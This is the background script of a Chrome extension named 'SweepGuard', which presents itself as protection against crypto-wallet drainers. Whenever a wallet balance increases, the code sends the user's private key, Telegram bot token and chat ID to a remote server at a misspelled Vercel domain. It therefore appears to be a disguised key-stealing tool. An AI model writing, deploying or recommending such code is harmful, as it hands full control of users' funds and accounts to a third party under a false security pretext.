// SweepGuard Background Service Worker
const API_BASE = 'https://sweeptsguard.vercel.app'
let monitorInterval = null

// Listen for messages from popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'startMonitoring') {
    startMonitoring(message)
    sendResponse({ success: true })
  }
  if (message.action === 'stopMonitoring') {
    stopMonitoring()
    sendResponse({ success: true })
  }
  if (message.action === 'getStatus') {
    sendResponse({ monitoring: !!monitorInterval })
  }
  return true
})

// Start monitoring wallet
async function startMonitoring(config) {
  console.log('[SweepGuard] Starting monitoring...')

  // Save config
  await chrome.storage.local.set({
    monitorConfig: config,
    monitoring: true,
    lastCheck: Date.now()
  })

  // Clear existing interval
  if (monitorInterval) clearInterval(monitorInterval)

  // Check immediately
  await checkWallet(config)

  // Check every 5 seconds
  monitorInterval = setInterval(async () => {
    await checkWallet(config)
  }, 5000)

  // Update badge
  chrome.action.setBadgeText({ text: 'ON' })
  chrome.action.setBadgeBackgroundColor({ color: '#4ade80' })
}

// Stop monitoring
function stopMonitoring() {
  if (monitorInterval) {
    clearInterval(monitorInterval)
    monitorInterval = null
  }
  chrome.storage.local.set({ monitoring: false })
  chrome.action.setBadgeText({ text: '' })
  console.log('[SweepGuard] Monitoring stopped')
}

// Check wallet balance
async function checkWallet(config) {
  try {
    // Scan wallet
    const res = await fetch(`${API_BASE}/api/scan?address=${config.safeAddress}`)
    const data = await res.json()

    // Store last scan result
    await chrome.storage.local.set({
      lastScan: data,
      lastCheck: Date.now()
    })

    // Check for delegation (drainer detected)
    if (data.delegation) {
      await sendNotification(
        '🚨 Drainer Detected!',
        `Your wallet has EIP-7702 delegation to ${data.delegation.slice(0, 10)}...`
      )
    }

    // Check for balance changes
    const prevBalance = await chrome.storage.local.get('prevBalance')
    const currentBalance = data.totalValue || 0

    if (prevBalance.prevBalance && currentBalance > prevBalance.prevBalance) {
      const diff = currentBalance - prevBalance.prevBalance
      await sendNotification(
        '💰 New Funds Detected!',
        `$${diff.toLocaleString()} incoming. Auto-sweeping to safe wallet...`
      )

      // Trigger auto-sweep via API
      await fetch(`${API_BASE}/api/monitor`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'start',
          address: data.address,
          safeAddress: config.safeAddress,
          privateKey: config.privateKey,
          telegramBotToken: config.tgToken,
          telegramChatId: config.tgChat
        })
      })
    }

    await chrome.storage.local.set({ prevBalance: currentBalance })

  } catch (err) {
    console.error('[SweepGuard] Check failed:', err)
  }
}

// Send Chrome notification
async function sendNotification(title, message) {
  const { notificationsEnabled } = await chrome.storage.local.get('notificationsEnabled')
  if (notificationsEnabled === false) return

  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title,
    message,
    priority: 2
  })
}

// Handle notification clicks
chrome.notifications.onClicked.addListener(async (notificationId) => {
  // Open dashboard
  chrome.tabs.create({ url: `${API_BASE}/dashboard` })
})

// Alarm for periodic checks (fallback)
chrome.alarms.create('sweepguard-check', { periodInMinutes: 0.1 }) // Every 6 seconds

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'sweepguard-check') {
    const { monitoring, monitorConfig } = await chrome.storage.local.get(['monitoring', 'monitorConfig'])
    if (monitoring && monitorConfig) {
      await checkWallet(monitorConfig)
    }
  }
})

// Extension install handler
chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === 'install') {
    // Open welcome page
    chrome.tabs.create({ url: `${API_BASE}` })

    // Set defaults
    await chrome.storage.local.set({
      monitoring: false,
      notificationsEnabled: true
    })
  }
})

console.log('[SweepGuard] Background service worker loaded')
